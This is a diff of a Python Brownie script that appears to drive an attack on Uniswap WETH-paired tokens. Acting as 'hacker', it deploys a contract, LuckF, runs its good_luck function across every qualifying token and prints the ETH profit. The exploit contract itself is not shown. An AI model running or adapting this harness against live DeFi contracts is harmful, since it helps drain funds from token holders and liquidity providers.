@@ -1,5 +1,5 @@
 from operator import le
-from brownie import ZERO_ADDRESS, accounts, interface, Luck
+from brownie import ZERO_ADDRESS, accounts, interface, Luck, LuckF
 import json
 
 weth = interface.ERC20('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
@@ -21,9 +21,15 @@ def main():
         weth_pair_tokens_uni.append(t)
     print('len of tokens in uni: ', len(weth_pair_tokens_uni))
     print(weth_pair_tokens_uni)
-    l = Luck.deploy({'from': hacker})
-    l.good_luck(weth_pair_tokens_uni, {'from': hacker, 'value': 1e21})
-    print('profit: ', (l.balance() - 1e21)/1e18, ' ETH')
+    
+    # l1 = Luck.deploy({'from': hacker})
+    # l1.good_luck(weth_pair_tokens_uni, {'from': hacker, 'value': 1e21})
+    
+    l2 = LuckF.deploy({'from': hacker})
+    l2.good_luck(weth_pair_tokens_uni, {'from': hacker})
+
+    # print(f'profit of l1: {(l1.balance() - 1e21)/1e18} ETH')
+    print(f'profit of l2: {l2.balance() / 1e18} ETH')
 
 def get_all_weth_pair_tokens():
     data = {}
@@ -34,8 +40,9 @@ def get_all_weth_pair_tokens():
     weth_pair_tokens = []
     for pair_addr in data.keys():
         pair = data[pair_addr]
-        token = pair['token1']['address'] if pair['token0']['address'] == weth else pair['token0']['address'] if pair['token1']['address'] == weth else None  
-        if token is None or pair['token0']['router_reserve'] < 1e18 or pair['token1']['router_reserve'] < 1e18:
+        if not (token := pair['token1']['address'] if pair['token0']['address'] == weth else pair['token0']['address'] if pair['token1']['address'] == weth else None) or \
+            pair['token0']['router_reserve'] < 1e18 or \
+            pair['token1']['router_reserve'] < 1e18:
             continue
         weth_pair_tokens.append(token)
     return weth_pair_tokens
